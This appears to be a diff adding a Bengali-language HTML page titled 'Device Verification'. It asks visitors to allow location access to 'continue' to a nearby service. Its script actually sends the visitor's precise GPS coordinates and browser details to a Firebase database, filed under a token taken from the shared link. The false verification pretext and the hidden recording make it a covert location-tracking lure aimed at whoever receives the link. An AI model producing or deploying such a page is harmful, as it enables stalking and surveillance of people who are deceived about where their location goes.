@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Verification</title>
+  <style>
+    body {
+      background: #0f172a;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .card {
+      background: #1e293b;
+      padding: 30px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+    }
+    .icon {
+      font-size: 50px;
+      margin-bottom: 15px;
+    }
+    h2 {
+      margin: 0 0 10px 0;
+      color: #38bdf8;
+      font-size: 22px;
+    }
+    p {
+      color: #94a3b8;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+    button {
+      background: #0284c7;
+      color: white;
+      border: 0;
+      padding: 14px 20px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 10px;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    button:hover {
+      background: #0369a1;
+    }
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #38bdf8;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="icon">📍</div>
+  <h2>লোকেশন নিশ্চিতকরণ</h2>
+  <p>পরবর্তী ধাপে যেতে এবং আপনার নিকটবর্তী সার্ভিস চালু করতে নিচে ক্লিক করে লোকেশন <b>"Allow"</b> করুন।</p>
+  
+  <button id="actionBtn" onclick="requestUserLocation()">চালিয়ে যান (Continue)</button>
+  <div id="status"></div>
+</div>
+
+<!-- Firebase Scripts -->
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
+
+<script>
+  // ১. আপনার Firebase কনফিগারেশন বসান
+  const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT.firebaseapp.com",
+    databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
+    projectId: "YOUR_PROJECT",
+    storageBucket: "YOUR_PROJECT.appspot.com",
+    messagingSenderId: "YOUR_ID",
+    appId: "YOUR_WEB_APP_ID"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+  const db = firebase.database();
+
+  // URL থেকে টোকেন নেওয়া
+  const urlParams = new URLSearchParams(location.search);
+  const token = urlParams.get("share") || "guest_" + Date.now();
+
+  async function requestUserLocation() {
+    const status = document.getElementById("status");
+    const btn = document.getElementById("actionBtn");
+
+    if (!navigator.geolocation) {
+      status.innerText = "আপনার ব্রাউজার জিপিএস সাপোর্ট করে না।";
+      return;
+    }
+
+    btn.disabled = true;
+    btn.style.opacity = "0.7";
+    status.innerText = "ব্রাউজারে 'Allow' চাপুন...";
+
+    try {
+      // Firebase Anonymous লগইন
+      await auth.signInAnonymously();
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          status.innerText = "লোকেশন ভেরিফাই হচ্ছে...";
+
+          const locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            device: navigator.userAgent,
+            status: "shared",
+            timestamp: Date.now()
+          };
+
+          // ডাটাবেজে লোকেশন পাঠানো
+          await db.ref("sessions/" + token).update(locationData);
+
+          status.innerHTML = "<span style='color:#4ade80'>✓ সফলভাবে সম্পন্ন হয়েছে!</span>";
+          btn.style.display = "none";
+        },
+        (error) => {
+          btn.disabled = false;
+          btn.style.opacity = "1";
+          if (error.code === error.PERMISSION_DENIED) {
+            status.innerHTML = "<span style='color:#f87171'>আপনি লোকেশন পারমিশন দেননি! দয়া করে ফোনের GPS অন করে 'Allow' দিন।</span>";
+          } else {
+            status.innerText = "ত্রুটি: " + error.message;
+          }
+        },
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+      );
+
+    } catch (err) {
+      btn.disabled = false;
+      btn.style.opacity = "1";
+      status.innerText = "Error: " + err.message;
+    }
+  }
+
+  // পেজ লোড হলেই স্বয়ংক্রিয়ভাবে ক্লিক ট্রিগার করার চেষ্টা
+  window.onload = () => {
+    // কিছু ব্রাউজার ইউজার ক্লিক ছাড়া এলাউ করে না, তাই বাটনে ক্লিক করাই ভালো
+  };
+</script>
+
+</body>
+</html>
